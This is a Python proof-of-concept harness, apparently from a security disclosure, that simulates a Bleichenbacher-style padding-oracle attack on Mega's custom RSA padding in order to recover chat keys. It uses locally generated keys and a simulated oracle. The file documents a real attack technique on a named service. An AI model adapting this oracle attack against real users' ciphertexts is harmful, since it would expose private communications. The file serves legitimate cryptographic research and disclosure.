
#
# This file is part of the PoCs for various issues found in the cryptographic
# design of Mega.
#
# Content: PoC of the Guess-and-Purge Bleichenbacher-Esque attack on Mega's
# custom padding to decrypt RSA ciphertexts.
#

from issue_05.gap_bleichenbacher_attack import *
from issue_05.utils.interval import *

class PoCAbstractGaPBleichenbacherAttack:
    def __init__(self):
        print("# Initialize abstract Guess-and-Purge Bleichenbacher PoC")
        print(f"## Generate fresh RSA-{RSA_MODULUS_BIT_SIZE} keys")
        _sk, self.pk = gen_rsa_keys(RSA_MODULUS_BIT_SIZE)
        self.sk = decode_rsa_privk(_sk)

        print(f"### Using public key: {tuple(map(hex, self.pk))}")
        print(f"### Using secret key: {tuple(map(hex, self.sk))}")

    def _decrypt_oracle_template(self, sk, ct):
        return chat_rsa_decrypt(ct, sk)

    def _form_predicate(self, m):
        return len(m) % CHAT_KEY_BYTE_LEN == 0

    def run_sanity_checks(self):
        print("## Run sanity checks")

        # Load test vector

        n = b64_to_int('wT+JSBnBNjgalMGT5hmFHd/N5eyncAA+w1TzFC4PYfBnbX1CFcx6E7BuB0SqgxbJw3ZsvvowsjRvuo8SNtfmVIz4fZV45pBPxCkeCWonN/'
                 + 'zZZiT3LnYnk1BfnfxfoXtEYRrdVPXAC/VDc9cgy29OXKuuNsREKznb9JFYQUVH9FM=')
        e = b64_to_int('AQAB')
        p = b64_to_int('7y+NkdfNlnENazteobZ2K0IU7+Mp59BgmrhBl0TvhiA5HkI9WJDIZK67NsDa9QNdJ/NCfmqE/eNkZqFLVq0c+w==')
        q = b64_to_int('ztVHfgrLnINsPFTjMmjgZM6M39QEUsi4erg4s2tJiuIv29szH1n2HdPKFRIUPnemj48kANvp5XagAAhOb8u2iQ==')
        d = pow(e, -1, (p-1)*(q-1))

        pk = (n, e)
        sk = (n, d)

        m = b"sanity check"
        m_enc = chat_rsa_encrypt(chat_len_encode(m), pk)
        assert chat_len_decode(chat_rsa_decrypt(m_enc, sk)) == m
        print("### Chat RSA enc/dec: success")

        # CT modification
        s = 0xc1bbee
        m = 0x101031653d2738416ad796487f7a591f51d9a78a2cbb7937ea9c92a23e0ed6a6a8a00a1c9c54bd878a466f848fedc12bed6b944641ae673cbf44171ec56bb887e8c77a77362764b8ce5b7b5fc3eb8170e69562e58ed368a06184ca16625101e183502d35c53c3cc50af8a73f0bf0a7786438c6b7d4485b9a2bcf3b243f
        ct = 0x205940695f1534006bb2a72f203c8ffebb30d4f507665c98a75ba086780b39f08b19b8673e3afeccb8633f5c61283f56b5133c16f067976a89e56f93a54f104bfab8e0ec4ecd00c446005d5220b9b3b7f0e14721f3066f4299796056f0195e8ec47388f2747f1b3060dbc96708825cc1cac3cde94984a3d9e8a33a00508f93d2
        assert((m * s) % n == pow((pow(s, e, n) * ct) % n, d, n))
        print("### Ciphertext modification: success")

        assert CHAT_KEY_BYTE_LEN <= ceil_int_div(RSA_MODULUS_BIT_SIZE, 8) - 4, \
            "data does not fit, too small modulus"
        print("### Modulus size check: success")

        run_interval_sanity_checks("### ")

    def gap_bleichenbacher_attack(self, ct, pt_len, print_prefix):
        """
        Perform abstract version of our Guess-and-Purge variant of
        Bleichenbacher's attack, simulating Mega's RSA encryption/decryption
        behavior.

        :param ct: Ciphertext object that internally stores the decryption oracle
        :param print_prefix: indent for printing
        :param pt_len: length of the plaintext (in bytes)
        """

        attack = MegaGaPBleichenbacher(print_prefix)
        return attack.perform_gap_attack(ct, pt_len, self.pk)

    def run_attack(self):
        print("## Starting abstract attack")

        decrypt_oracle = lambda ct, sk=self.sk: self._decrypt_oracle_template(sk, ct)

        key = token_bytes(CHAT_KEY_BYTE_LEN)
        key_int = bytes_to_int(key)
        print(f"### Newly generated target chat key: {hex(key_int)}")

        # IMPOTANT: We avoid RSA operations by computing in the plaintext domain
        # to make the simulation faster. This is an implementation trick and not
        # necessary -- nor possible -- in practice. The ciphertext class
        # abstracts away the plaintext operations and also implements the normal
        # ciphertext version.
        m = bytes_to_int(chat_rsa_pad(key, RSA_MODULUS_BYTE_SIZE))
        ct = Ciphertext(self.pk, decrypt_oracle, self._form_predicate, m=m,
                        max_query_thr=10**7)

        possible_pts = self.gap_bleichenbacher_attack(ct, CHAT_KEY_BYTE_LEN,
                            print_prefix="### ")

        possible_pts_hex = list(map(hex, possible_pts))
        print(f"### Recovered plaintexts: {possible_pts_hex}")

        if key_int not in possible_pts:
            print(f"### Attack: failed!")
            return
        print("### Attack: successful!")
